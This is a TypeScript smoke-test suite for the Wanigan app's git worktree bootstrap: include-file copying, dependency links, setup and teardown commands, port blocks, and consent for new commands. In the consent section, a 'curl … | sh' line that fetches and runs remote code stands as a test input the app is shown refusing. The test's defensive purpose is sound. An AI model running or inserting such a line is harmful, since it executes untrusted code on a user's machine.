import { app } from 'electron';
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { db } from './db';
import { addProject, removeProject } from './store';
import * as worktrees from './worktrees';
import * as wtSetup from './worktree-setup';
import {
  PORT_BLOCK_SIZE, describeInclude, isPortBlockBase, portBlockBase, runFacts, seedFromHex,
  type WorktreeCommandEnv,
} from '../shared/worktree-bootstrap';

type Check = (ok: boolean, label: string, detail?: unknown) => void;
type Say = (s: string) => void;

/**
 * Worktree bootstrap against real repositories: what `.worktreeinclude` copies
 * and refuses, how dependency folders arrive under link, clone and skip, the
 * setup and teardown commands with their environment and evidence, the port
 * block, and the consent in front of new command text. Every git call and
 * every command is real; nothing reaches a network or a model.
 */
export async function runWorktreeBootstrapSmoke(rawCheck: Check, say: Say): Promise<void> {
  // The runner prints a detail with String(), which turns every object into
  // "[object Object]" — a failure whose evidence cannot be read.
  const check: Check = (ok, label, detail) =>
    rawCheck(ok, label, detail === undefined || typeof detail === 'string' ? detail : JSON.stringify(detail));
  const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'wanigan-wtboot-')));
  const made: string[] = [];
  const projectIds: string[] = [];
  const repo = (name: string) => {
    const dir = path.join(tmp, name);
    fs.mkdirSync(dir, { recursive: true });
    const git = (...args: string[]) => execFileSync('git', ['-C', dir, ...args], { stdio: 'pipe' }).toString();
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 'smoke@wanigan.test');
    git('config', 'user.name', 'Smoke');
    return { dir, git };
  };
  const write = (file: string, text: string) => { fs.mkdirSync(path.dirname(file), { recursive: true }); fs.writeFileSync(file, text); };
  const create = async (dir: string, label: string, sessionId: string) => {
    const wt = await worktrees.createWorktree(dir, label, sessionId);
    made.push(wt.path);
    return wt;
  };
  const message = (e: unknown) => (e instanceof Error ? e.message : String(e));
  const lists = (projectId: string) => {
    const stored = wtSetup.worktreeCommands(projectId);
    return JSON.stringify({ setup: stored.setup, teardown: stored.teardown });
  };

  try {
    /* ── .worktreeinclude ─────────────────────────────────────────────── */
    say('── worktree bootstrap · .worktreeinclude');
    const inc = repo('include');
    write(path.join(inc.dir, '.gitignore'), '.env.*\n!.env.example\n*.key\nsecrets/\nnode_modules/\n');
    write(path.join(inc.dir, '.worktreeinclude'), '# machine-local files a checkout cannot run without\n.env.*\n*.key\nsecrets/\nnotes.txt\n');
    write(path.join(inc.dir, 'tracked.key'), 'committed\n');
    inc.git('add', '.gitignore', '.worktreeinclude');
    inc.git('add', '-f', 'tracked.key');
    inc.git('commit', '-qm', 'first');
    // After the commit: the main checkout's copy of a tracked file differs from
    // the commit, so a worktree holding this text would prove it was copied.
    write(path.join(inc.dir, 'tracked.key'), 'changed in the main checkout, uncommitted\n');
    write(path.join(inc.dir, '.env.test'), 'TOKEN=test\n');
    write(path.join(inc.dir, '.env.local'), 'LOCAL=1\n');
    write(path.join(inc.dir, '.env.example'), 'TOKEN=\n');
    write(path.join(inc.dir, 'config', 'master.key'), 'master\n');
    fs.chmodSync(path.join(inc.dir, 'config', 'master.key'), 0o600);
    write(path.join(inc.dir, 'secrets', 'dev.pem'), 'pem\n');
    // A name git would C-quote if it were asked on the command line.
    const oddName = 'odd "quoted" \\ name.key';
    write(path.join(inc.dir, oddName), 'odd\n');
    write(path.join(inc.dir, 'notes.txt'), 'half-written, never ignored\n');
    write(path.join(inc.dir, 'node_modules', 'pkg', 'deep.key'), 'inside a linked folder\n');
    fs.symlinkSync(path.join(inc.dir, 'notes.txt'), path.join(inc.dir, 'link.key'));

    const iw = await create(inc.dir, 'include', 's_wtboot_inc1');
    const got = iw.bootstrap?.include;
    const inWt = (rel: string) => path.join(iw.path, rel);
    const readIn = (rel: string) => { try { return fs.readFileSync(inWt(rel), 'utf8'); } catch { return null; } };
    check(readIn('.env.test') === 'TOKEN=test\n' && readIn('config/master.key') === 'master\n' && readIn('secrets/dev.pem') === 'pem\n',
      'every untracked file that matches a .worktreeinclude pattern and is gitignored is copied into the new worktree, including one under a directory pattern and one in a folder the worktree did not have', got);
    check(readIn(oddName) === 'odd\n', 'a gitignored match whose name holds a quote and a backslash is copied under its own name', got);
    check(readIn('tracked.key') === 'committed\n',
      'a tracked file that matches a pattern is never copied: the worktree holds the committed text, not the main checkout’s uncommitted edit', readIn('tracked.key'));
    check(readIn('.env.example') === null && readIn('notes.txt') === null,
      'an untracked file that matches a pattern but that git does not ignore — a negated ignore rule, or a file nobody ignored — is left out');
    check(got?.state === 'read' && got.copied === 4 && got.present === 1 && got.notIgnored === 2 && got.symlinks === 1 && got.outside === 1 && got.failed === 0,
      'the creation result counts four copied, one already placed by the env-file copy, two not ignored, one symlink not followed and one refused for landing through the linked node_modules', got);
    check(got?.state === 'read' && got.bytes === 'TOKEN=test\n'.length + 'master\n'.length + 'pem\n'.length + 'odd\n'.length,
      'the creation result reports the bytes it copied, so the caller can show them', got);
    let linkLeft = true;
    try { fs.lstatSync(inWt('link.key')); } catch { linkLeft = false; }
    check(!linkLeft, 'a symlink that matches a pattern is not followed or recreated: a link can name any file on the machine');
    check(fs.readFileSync(path.join(inc.dir, 'node_modules', 'pkg', 'deep.key'), 'utf8') === 'inside a linked folder\n'
      && fs.lstatSync(inWt('node_modules')).isSymbolicLink(),
      'a match inside a dependency folder the worktree links to is refused rather than written through the link into the main checkout');
    let keyMode = -1;
    try { keyMode = fs.statSync(inWt('config/master.key')).mode & 0o777; } catch { /* asserted below */ }
    check(keyMode === 0o600, 'a 0600 key stays 0600 in the worktree', keyMode.toString(8));
    // Only the copies are asserted here. Whether the linked node_modules itself
    // reads clean is link mode's question, asserted with the dependency folders.
    const incStatus = execFileSync('git', ['-C', iw.path, 'status', '--porcelain', '--untracked-files=all'], { stdio: 'pipe' }).toString();
    check(!/\.env\.test|master\.key|dev\.pem/.test(incStatus),
      'nothing the include file copied shows in git status, because every copy is a gitignored file', incStatus);

    const stopAt = fs.mkdtempSync(path.join(tmp, 'limit-files-'));
    const byFiles = await worktrees.copyWorktreeIncludes(inc.dir, stopAt, { files: 2, bytes: 1024 ** 3 });
    check(byFiles.state === 'read' && byFiles.copied === 2 && byFiles.stopped?.by === 'files' && byFiles.stopped.unexamined > 0
      && /stopped at the 2-file limit; \d+ more match(es)? not examined/.test(describeInclude(byFiles) ?? ''),
    'a file-count limit stops the copy at that count and says how many matches it did not examine, instead of trimming quietly', byFiles);
    const byBytes = await worktrees.copyWorktreeIncludes(inc.dir, fs.mkdtempSync(path.join(tmp, 'limit-bytes-')), { files: 100, bytes: 12 });
    check(byBytes.state === 'read' && byBytes.copied === 1 && byBytes.bytes === 'LOCAL=1\n'.length && byBytes.stopped?.by === 'bytes',
      'a byte limit stops the copy before the file that would pass it, and the result says the byte limit is why', byBytes);
    write(path.join(inc.dir, '.worktreeinclude'), '# only comments\n\n');
    const empty = await worktrees.copyWorktreeIncludes(inc.dir, fs.mkdtempSync(path.join(tmp, 'limit-none-')));
    check(empty.state === 'read' && empty.patterns === 0 && empty.copied === 0 && describeInclude(empty) === '.worktreeinclude has no patterns, so nothing was copied from it',
      'an include file with only comments copies nothing and says it has no patterns', empty);
    fs.rmSync(path.join(inc.dir, '.worktreeinclude'));
    const absent = await worktrees.copyWorktreeIncludes(inc.dir, fs.mkdtempSync(path.join(tmp, 'limit-absent-')));
    check(absent.state === 'absent', 'a repository with no .worktreeinclude reports it absent, not as a file that matched nothing', absent);

    /* ── dependency folders ───────────────────────────────────────────── */
    say('── worktree bootstrap · dependency folders');
    const deps = repo('deps');
    write(path.join(deps.dir, '.gitignore'), 'node_modules/\n');
    write(path.join(deps.dir, 'a.txt'), 'one\n');
    deps.git('add', '-A');
    deps.git('commit', '-qm', 'first');
    const mainMarker = path.join(deps.dir, 'node_modules', 'marker.txt');
    write(mainMarker, 'main\n');
    const depsProject = await addProject(deps.dir);
    projectIds.push(depsProject.id);

    check(wtSetup.depsModeFor(depsProject.id) === 'link', 'a project that never chose keeps the behaviour it had: dependency folders are linked');
    const linked = await create(deps.dir, 'link', 's_wtboot_link');
    const linkedOutcome = linked.bootstrap?.deps.find((d) => d.path === 'node_modules');
    fs.writeFileSync(path.join(linked.path, 'node_modules', 'marker.txt'), 'changed in the linked worktree\n');
    check(linkedOutcome?.result === 'linked' && fs.lstatSync(path.join(linked.path, 'node_modules')).isSymbolicLink()
      && fs.readFileSync(mainMarker, 'utf8') === 'changed in the linked worktree\n',
    'under link, a file changed inside the worktree’s node_modules changes the main checkout’s — the sharing a clone exists to avoid', linkedOutcome);
    fs.writeFileSync(mainMarker, 'main\n');

    // A `node_modules/` rule matches directories only and git does not treat a
    // symlink as one, so before the exclude line every linked worktree listed
    // `?? node_modules`: merge and removal counted it as uncommitted work, and
    // `git add -A` committed a link to the operator's checkout.
    const linkedAgain = await create(deps.dir, 'link again', 's_wtboot_link2');
    const excludeText = fs.readFileSync(path.join(deps.dir, '.git', 'info', 'exclude'), 'utf8');
    const statusOf = (dir: string) => execFileSync('git', ['-C', dir, 'status', '--porcelain', '--untracked-files=all'], { stdio: 'pipe' }).toString();
    check(statusOf(linked.path) === '' && statusOf(linkedAgain.path) === '' && statusOf(deps.dir) === ''
      && excludeText.split('\n').filter((line) => line === '/node_modules').length === 1 && excludeText.includes('# Wanigan links these dependency folders'),
    'a linked node_modules reads clean in every worktree: one anchored line under a Wanigan comment in the local exclude file, written once however many worktrees link it, and the main checkout is unchanged',
    { linked: statusOf(linked.path), again: statusOf(linkedAgain.path), exclude: excludeText });
    let linkIgnored = false;
    try { execFileSync('git', ['-C', linked.path, 'check-ignore', '-q', 'node_modules'], { stdio: 'pipe' }); linkIgnored = true; } catch { /* exit 1: not ignored */ }
    check(linkIgnored, 'git reports the link itself as ignored in the worktree, so `git add -A` there cannot commit it');

    check(wtSetup.setDepsMode(depsProject.id, 'clone') === 'clone' && wtSetup.depsModeFor(depsProject.id) === 'clone'
      && (db().prepare('SELECT mode FROM project_worktree_deps WHERE project_id = ?').get(depsProject.id) as { mode: string } | undefined)?.mode === 'clone',
    'the dependency choice is stored per project in Wanigan’s database');
    const cloned = await create(deps.dir, 'clone', 's_wtboot_clone');
    const clonedOutcome = cloned.bootstrap?.deps.find((d) => d.path === 'node_modules');
    const clonedDir = path.join(cloned.path, 'node_modules');
    if (process.platform === 'darwin') {
      fs.writeFileSync(path.join(clonedDir, 'marker.txt'), 'changed in the cloned worktree\n');
      check(clonedOutcome?.result === 'cloned' && clonedOutcome.durationMs !== null && !fs.lstatSync(clonedDir).isSymbolicLink()
        && fs.readFileSync(mainMarker, 'utf8') === 'main\n',
      'under clone, the worktree gets its own copy-on-write node_modules, and a file changed inside it leaves the main checkout’s untouched', clonedOutcome);
      const cloneStatus = execFileSync('git', ['-C', cloned.path, 'status', '--porcelain'], { stdio: 'pipe' }).toString();
      check(cloneStatus === '',
        'a cloned node_modules is a directory the `node_modules/` rule ignores, so the worktree reads clean', { cloneStatus });
    } else {
      check(clonedOutcome?.result === 'linked' && /not macOS/.test(clonedOutcome.detail ?? ''),
        'where copy-on-write clones are unavailable, a clone request falls back to a link and the result records why', clonedOutcome);
    }

    const locked = path.join(deps.dir, 'node_modules', 'locked.bin');
    const asRoot = typeof process.getuid === 'function' && process.getuid() === 0;
    if (process.platform === 'darwin' && !asRoot) {
      write(locked, 'unreadable\n');
      fs.chmodSync(locked, 0o000);
      try {
        const fellBack = await create(deps.dir, 'clone fails', 's_wtboot_cpfail');
        const outcome = fellBack.bootstrap?.deps.find((d) => d.path === 'node_modules');
        check(outcome?.requested === 'clone' && outcome.result === 'linked' && /cp -c exited 1/.test(outcome.detail ?? '')
          && fs.lstatSync(path.join(fellBack.path, 'node_modules')).isSymbolicLink(),
        'a clone that cp cannot finish is removed, replaced by a link, and the result records cp’s own reason', outcome);
      } finally {
        fs.chmodSync(locked, 0o644);
        fs.rmSync(locked, { force: true });
      }
    } else {
      say('   (a failing cp -c needs macOS and a non-root user; the fallback on a real cp failure was not exercised here)');
    }

    wtSetup.setDepsMode(depsProject.id, 'skip');
    const skipped = await create(deps.dir, 'skip', 's_wtboot_skip');
    check(skipped.bootstrap?.deps.find((d) => d.path === 'node_modules')?.result === 'skipped' && !fs.existsSync(path.join(skipped.path, 'node_modules')),
      'under skip, the worktree gets no node_modules at all, and the result says it was skipped', skipped.bootstrap?.deps);
    let badMode = '';
    try { wtSetup.setDepsMode(depsProject.id, 'copy'); } catch (e) { badMode = message(e); }
    let badProject = '';
    try { wtSetup.setDepsMode('prj_missing', 'link'); } catch (e) { badProject = message(e); }
    check(/not a dependency folder choice/.test(badMode) && badProject === 'Project not found.' && wtSetup.depsModeFor(depsProject.id) === 'skip',
      'a dependency choice other than link, clone or skip, or for a project that does not exist, is refused in main and changes nothing', { badMode, badProject });

    /* ── setup and teardown ───────────────────────────────────────────── */
    say('── worktree bootstrap · setup and teardown');
    const cmds = repo('commands');
    write(path.join(cmds.dir, 'a.txt'), 'one\n');
    cmds.git('add', '-A');
    cmds.git('commit', '-qm', 'first');
    const cmdProject = await addProject(cmds.dir);
    projectIds.push(cmdProject.id);
    const cmdRoot = await worktrees.repoRootFor(cmds.dir);
    wtSetup.saveWorktreeCommands(cmdProject.id, {
      setup: [
        'echo "setup-env $WANIGAN_WORKTREE|$WANIGAN_REPO_ROOT|$WANIGAN_PORT|$WANIGAN_PORT_COUNT"',
        'echo "setup-cwd $(pwd -P)"',
      ],
      teardown: ['test -d "$WANIGAN_WORKTREE" && echo "teardown-env $WANIGAN_WORKTREE|$WANIGAN_PORT|$WANIGAN_PORT_COUNT"'],
    });
    check(cmds.git('status', '--porcelain') === '', 'saving setup and teardown commands writes nothing into the repository');

    const sw = await create(cmds.dir, 'setup passes', 's_wtboot_setup');
    const ports = sw.bootstrap?.ports;
    const setupRun = wtSetup.latestWorktreeRun(sw.path, 'setup');
    check(sw.bootstrap?.setup?.status === 'passed' && sw.bootstrap.setup.ran === 2 && setupRun?.status === 'passed'
      && setupRun.results.every((r) => r.exitCode === 0 && r.durationMs >= 0),
    'setup runs in the new worktree right after creation, and each command’s exit code and duration are recorded', setupRun);
    check(!!ports && !!setupRun && setupRun.results[0].output.includes(`setup-env ${sw.path}|${cmdRoot}|${ports.base}|${PORT_BLOCK_SIZE}`)
      && setupRun.results[1].output.includes(`setup-cwd ${sw.path}`),
    'setup is given WANIGAN_WORKTREE, WANIGAN_REPO_ROOT, WANIGAN_PORT and WANIGAN_PORT_COUNT, runs with the worktree as its directory, and its output is recorded', setupRun?.results);
    const launchEnv = await worktrees.worktreeLaunchEnv(sw.path);
    check(!!ports && launchEnv.WANIGAN_PORT === String(ports.base) && launchEnv.WANIGAN_PORT_COUNT === String(PORT_BLOCK_SIZE)
      && launchEnv.WANIGAN_WORKTREE === sw.path && setupRun?.env?.WANIGAN_PORT === launchEnv.WANIGAN_PORT,
    'the launch environment names the same port block and worktree the setup was given', { launchEnv, env: setupRun?.env });

    // The agent's environment, not only the function that would build it. A
    // pack's WANIGAN_PORT, or one inherited from a Wanigan started inside a
    // worktree session, would tell an agent a port block that is not its own.
    const { __test: sessionsTest } = await import('./sessions');
    const { headlessEnv } = await import('./headless');
    const inheritedPort = process.env.WANIGAN_PORT;
    process.env.WANIGAN_PORT = '1';
    try {
      const attended = sessionsTest.agentEnv('/usr/bin', 's_wtboot_env', { WANIGAN_PORT: '9' }, null, launchEnv);
      const outside = sessionsTest.agentEnv('/usr/bin', 's_wtboot_outside');
      const headless = headlessEnv('/usr/bin', { WANIGAN_PORT: '9' }, null, launchEnv);
      const headlessOutside = headlessEnv('/usr/bin');
      check(attended.WANIGAN_PORT === launchEnv.WANIGAN_PORT && attended.WANIGAN_PORT_COUNT === launchEnv.WANIGAN_PORT_COUNT
        && attended.WANIGAN_WORKTREE === sw.path && headless.WANIGAN_PORT === launchEnv.WANIGAN_PORT && headless.WANIGAN_WORKTREE === sw.path
        && outside.WANIGAN_PORT === undefined && headlessOutside.WANIGAN_PORT === undefined,
      'an agent in a worktree, attended or headless, gets the port block and path its setup got, over anything a pack names; an agent outside a worktree inherits none',
      { attended: attended.WANIGAN_PORT, headless: headless.WANIGAN_PORT, outside: outside.WANIGAN_PORT ?? null });
    } finally {
      if (inheritedPort === undefined) delete process.env.WANIGAN_PORT; else process.env.WANIGAN_PORT = inheritedPort;
    }
    const launchRoot = fs.existsSync(path.join(app.getAppPath(), 'src', 'main')) ? app.getAppPath() : process.cwd();
    const launchSrc = (file: string) => { try { return fs.readFileSync(path.join(launchRoot, 'src', 'main', file), 'utf8'); } catch { return ''; } };
    // Both paths hand their env builder the account itself rather than its
    // environment, because an account that contributes no variable still has to
    // clear an inherited one and a record cannot carry a deletion.
    check(/worktreeEnv = await worktreeLaunchEnv\(cwd\)/.test(launchSrc('sessions.ts')) && /agentEnv\(PATH, id, providerEnvValues, account, worktreeEnv\)/.test(launchSrc('sessions.ts'))
      && /worktreeEnv = await worktreeLaunchEnv\(worktree\)/.test(launchSrc('headless.ts')) && /headlessEnv\(launchPath, providerEnvValues, account, worktreeEnv\)/.test(launchSrc('headless.ts')),
    'both launch paths hand the worktree environment to the process they spawn, so the variables are reachable and not only buildable');

    const dirtyTree = await create(cmds.dir, 'kept for its files', 's_wtboot_dirty');
    fs.writeFileSync(path.join(dirtyTree.path, 'unsaved.txt'), 'agent work\n');
    const refusedRemoval = await worktrees.removeWorktree(dirtyTree.path, false);
    check(!refusedRemoval.removed && wtSetup.latestWorktreeRun(dirtyTree.path, 'teardown') === null,
      'a worktree kept for its uncommitted files is never torn down underneath them: teardown runs only once removal is going ahead', refusedRemoval);
    fs.rmSync(path.join(dirtyTree.path, 'unsaved.txt'));

    const removal = await worktrees.removeWorktree(sw.path, false);
    const teardownRun = wtSetup.latestWorktreeRun(sw.path, 'teardown');
    check(removal.removed && !fs.existsSync(sw.path) && teardownRun?.status === 'passed'
      && !!ports && teardownRun.results[0].output.includes(`teardown-env ${sw.path}|${ports.base}|${PORT_BLOCK_SIZE}`)
      && /Teardown ran first and passed/.test(removal.detail),
    'teardown runs before the worktree is removed — its directory still existed, it had the same ports — and the removal says so', { removal, teardownRun });

    const gone = await create(cmds.dir, 'deleted by hand', 's_wtboot_gone');
    fs.rmSync(gone.path, { recursive: true, force: true });
    const goneRemoval = await worktrees.removeWorktree(gone.path, false);
    check(goneRemoval.removed && /teardown commands were not run: there was no directory left to run them in/.test(goneRemoval.detail),
      'a worktree whose directory is already gone says its teardown could not run, rather than implying it did', goneRemoval.detail);

    wtSetup.saveWorktreeCommands(cmdProject.id, {
      setup: ['echo before-the-failure', 'echo on-stderr >&2; exit 3', 'echo never-reached'],
      teardown: [],
    });
    let threw = '';
    let failing: Awaited<ReturnType<typeof worktrees.createWorktree>> | null = null;
    try { failing = await create(cmds.dir, 'setup fails', 's_wtboot_fail'); } catch (e) { threw = message(e); }
    const failedSetup = failing?.bootstrap?.setup;
    check(!threw && !!failing && fs.existsSync(failing.path) && failedSetup?.status === 'failed',
      'a failing setup neither throws nor removes the worktree it ran in, so the launch that asked for the worktree still gets it', threw || failedSetup);
    const failedRun = failing ? wtSetup.latestWorktreeRun(failing.path, 'setup') : null;
    check(failedSetup?.stoppedAt?.command === 'echo on-stderr >&2; exit 3' && failedSetup.stoppedAt.exitCode === 3
      && failedSetup.ran === 2 && failedSetup.planned === 3
      && !!failedRun && failedRun.results[1].output.includes('on-stderr') && !JSON.stringify(failedRun.results).includes('never-reached'),
    'a failed setup names the command that ended it with its exit code, keeps its stderr, and runs nothing after it', failedRun);
    check(!!failedSetup && runFacts(failedSetup).endsWith('the worktree was kept and the launch was not held back'),
      'a failed setup says plainly that the worktree was kept and the launch went ahead', failedSetup && runFacts(failedSetup));
    const listed = failing ? (await worktrees.listWorktrees(cmds.dir)).find((w) => w.path === failing?.path) : undefined;
    check(listed?.bootstrap?.setup?.status === 'failed' && listed.bootstrap.setup.tail.includes('on-stderr') && listed.bootstrap.ports !== null,
      'the worktree list the Git view reads carries the newest setup run, its output tail and the port block', listed?.bootstrap);

    if (failing) {
      const env: WorktreeCommandEnv = { WANIGAN_WORKTREE: failing.path, WANIGAN_REPO_ROOT: cmdRoot ?? cmds.dir, WANIGAN_PORT: '42000', WANIGAN_PORT_COUNT: '10' };
      wtSetup.saveWorktreeCommands(cmdProject.id, { setup: ['sleep 20', 'echo after-the-limit'], teardown: [] });
      const t0 = Date.now();
      const limited = await wtSetup.runWorktreePhase('setup', { projectId: cmdProject.id, worktree: failing.path, env }, { budgetMs: 1_500 });
      const took = Date.now() - t0;
      check(!!limited && limited.status === 'failed' && limited.results.length === 1 && limited.results[0].exitCode === null
        && /limit ran out/.test(limited.results[0].output) && took < 10_000,
      'a setup past its time limit is stopped, recorded with no exit code and a note saying the limit ran out, and nothing after it runs', { took, limited });

      wtSetup.saveWorktreeCommands(cmdProject.id, { setup: ["(trap '' HUP; exec sleep 6) & echo started-in-background"], teardown: [] });
      const t1 = Date.now();
      const background = await wtSetup.runWorktreePhase('setup', { projectId: cmdProject.id, worktree: failing.path, env });
      const waited = Date.now() - t1;
      check(!!background && background.status === 'passed' && background.results[0].exitCode === 0 && waited < 5_000
        && background.results[0].output.includes('started-in-background') && /still holds its output open/.test(background.results[0].output),
      'a setup command that leaves a process running with its output open is recorded as exiting 0 within seconds, instead of holding the launch until the time limit', { waited, background });

      wtSetup.saveWorktreeCommands(cmdProject.id, { setup: ['yes 0123456789abcdef | head -c 200000'], teardown: [] });
      const loud = await wtSetup.runWorktreePhase('setup', { projectId: cmdProject.id, worktree: failing.path, env });
      check(!!loud && loud.results[0].output.length < 70 * 1024 && /kept the first 64KB/.test(loud.results[0].output),
        'recorded output is bounded, and a cut record says it was cut rather than reading as the whole output', loud?.results[0].output.length);
    }

    /* ── ports ────────────────────────────────────────────────────────── */
    say('── worktree bootstrap · port blocks');
    const probeTree = path.join(tmp, 'port-probe-tree');
    fs.mkdirSync(probeTree);
    const first = await worktrees.worktreePortBlock(probeTree);
    const again = await worktrees.worktreePortBlock(probeTree);
    const alias = path.join(tmp, 'port-probe-alias');
    fs.symlinkSync(probeTree, alias);
    const viaAlias = await worktrees.worktreePortBlock(alias);
    check(isPortBlockBase(first.base) && first.count === PORT_BLOCK_SIZE && again.base === first.base && viaAlias.base === first.base,
      'the same directory, however it is spelled, is handed the same ten-port block inside 42000–48999 each time it asks', { first, again, viaAlias });
    const ownBlock = portBlockBase(seedFromHex(createHash('sha256').update(probeTree).digest('hex')));
    check(first.skipped > 0 || first.base === ownBlock,
      'the block comes from a hash of the canonical path, moved along only when a block is taken', { first, ownBlock });

    const holder = net.createServer();
    const held = await new Promise<boolean>((resolve) => {
      holder.once('error', () => resolve(false));
      holder.listen(first.base + 7, '127.0.0.1', () => resolve(true));
    });
    if (held) {
      const moved = await worktrees.worktreePortBlock(probeTree);
      check(moved.base !== first.base && moved.skipped >= 1 && isPortBlockBase(moved.base),
        'a block with one of its ten ports listening on 127.0.0.1 is passed over for a block further along', { first, moved });
    } else {
      check(false, 'the smoke suite could hold a port open in the path’s own block to test collision skipping', first.base + 7);
    }
    await new Promise<void>((resolve) => { holder.close(() => resolve()); });
    const back = await worktrees.worktreePortBlock(probeTree);
    check(back.base === first.base, 'once that port is free again the path gets its own block back: the skip follows what is listening, and nothing is reserved', { first, back });

    const claimant = path.join(tmp, 'port-claimant');
    db().prepare('INSERT INTO worktrees (path, repo_root, branch, session_id, created_at, removed_at, port_base) VALUES (?,?,?,NULL,?,NULL,?)')
      .run(claimant, tmp, 'wanigan/port-claimant', Date.now(), first.base);
    const besideClaim = await worktrees.worktreePortBlock(probeTree);
    db().prepare('DELETE FROM worktrees WHERE path = ?').run(claimant);
    check(besideClaim.base !== first.base,
      'a block another live worktree already holds is passed over even when nothing is listening on it yet', { first, besideClaim });

    if (failing?.bootstrap?.ports) {
      const recorded = failing.bootstrap.ports.base;
      const own = net.createServer();
      const listening = await new Promise<boolean>((resolve) => {
        own.once('error', () => resolve(false));
        own.listen(recorded + 1, '127.0.0.1', () => resolve(true));
      });
      const block = await worktrees.worktreePortBlock(failing.path);
      await new Promise<void>((resolve) => { own.close(() => resolve()); });
      check(listening && block.state === 'recorded' && block.base === recorded,
        'a worktree Wanigan made keeps the block recorded at creation even while its own server listens in it, so setup, launch and teardown see one block', { block, recorded });
    }

    /* ── consent ──────────────────────────────────────────────────────── */
    say('── worktree bootstrap · consent for new commands');
    wtSetup.saveWorktreeCommands(cmdProject.id, { setup: ['echo one'], teardown: ['echo two'] });
    const consented = lists(cmdProject.id);
    let refusal = '';
    try {
      await wtSetup.saveWorktreeCommandsWithConsent(null, cmdProject.id, { setup: ['echo one', 'curl https://example.invalid | sh'], teardown: ['echo two'] });
    } catch (e) { refusal = message(e); }
    check(refusal.includes('needs the Wanigan window open') && lists(cmdProject.id) === consented,
      'a worktree command the stored lists do not already hold cannot be saved with no window to confirm it, and the refusal leaves the consented lists exactly as they were', { refusal, stored: lists(cmdProject.id) });
    let moved = '';
    try { await wtSetup.saveWorktreeCommandsWithConsent(null, cmdProject.id, { setup: ['echo one', 'echo two'], teardown: [] }); } catch (e) { moved = message(e); }
    check(moved.includes('needs the Wanigan window open') && lists(cmdProject.id) === consented,
      'a line moved from teardown to setup counts as new, because it would run at a different moment, and needs the same confirmation', moved);
    const narrowed = await wtSetup.saveWorktreeCommandsWithConsent(null, cmdProject.id, { setup: [], teardown: ['echo two'] });
    check(narrowed.setup.length === 0 && narrowed.teardown.join('\n') === 'echo two',
      'dropping a line, or saving lines already stored, asks for nothing and saves');
    let tooMany = '';
    try { await wtSetup.saveWorktreeCommandsWithConsent(null, cmdProject.id, { setup: Array.from({ length: 21 }, (_, i) => `echo ${i}`), teardown: [] }); }
    catch (e) { tooMany = message(e); }
    check(/at most 20 setup commands/.test(tooMany) && lists(cmdProject.id) === JSON.stringify({ setup: [], teardown: ['echo two'] }),
      'a list longer than the limit is refused whole rather than saved short', tooMany);
    const appRoot = fs.existsSync(path.join(app.getAppPath(), 'src', 'main')) ? app.getAppPath() : process.cwd();
    let indexSrc = '';
    try { indexSrc = fs.readFileSync(path.join(appRoot, 'src', 'main', 'modules', 'worktrees.ts'), 'utf8'); } catch { /* asserted below */ }
    const handler = /handle\('worktrees:saveCommands'[\s\S]{0,200}?\)\);/.exec(indexSrc)?.[0] ?? '';
    check(handler.includes('saveWorktreeCommandsWithConsent(context.getWindow(),') && !/saveWorktreeCommands\(/.test(indexSrc),
      'IPC reaches worktree commands only through the consent wrapper, never the unguarded save', handler || 'handler not found in src/main/modules/worktrees.ts');

    removeProject(cmdProject.id);
    projectIds.splice(projectIds.indexOf(cmdProject.id), 1);
    const leftCommands = db().prepare('SELECT COUNT(*) AS n FROM worktree_commands WHERE project_id = ?').get(cmdProject.id) as { n: number };
    const leftRuns = db().prepare('SELECT COUNT(*) AS n FROM worktree_command_runs WHERE project_id = ?').get(cmdProject.id) as { n: number };
    check(leftCommands.n === 0 && leftRuns.n > 0,
      'removing a project removes its stored commands, so a re-added one inherits none, while the evidence of what ran stays', { leftCommands, leftRuns });
  } catch (e) {
    check(false, `the worktree bootstrap smoke threw: ${message(e)}`);
  } finally {
    for (const id of projectIds) {
      try { wtSetup.saveWorktreeCommands(id, { setup: [], teardown: [] }); } catch { /* the project is already gone */ }
    }
    for (const p of made) {
      try { await worktrees.removeWorktree(p, true); } catch { /* removed during the suite */ }
    }
    for (const id of projectIds) {
      try { removeProject(id); } catch { /* already removed */ }
    }
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}
